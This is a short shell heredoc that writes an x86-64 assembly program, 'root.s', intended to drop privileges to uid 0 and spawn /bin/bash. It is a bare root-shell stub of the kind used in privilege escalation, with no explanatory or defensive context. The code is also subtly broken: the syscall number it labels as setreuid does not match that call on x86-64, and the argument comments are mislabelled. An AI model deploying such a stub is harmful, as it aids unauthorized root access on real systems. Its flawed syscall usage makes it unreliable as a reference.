cat > root.s << 'EOF'
.section .text
.globl _start

_start:
    xor %rdi, %rdi          # uid = 0
    xor %rsi, %rsi          # gid = 0
    mov $107, %rax          # setreuid
    syscall

    mov $59, %rax           # execve
    lea bash(%rip), %rdi
    xor %rsi, %rsi
    xor %rdx, %rdx
    syscall

bash:
    .string "/bin/bash"
EOF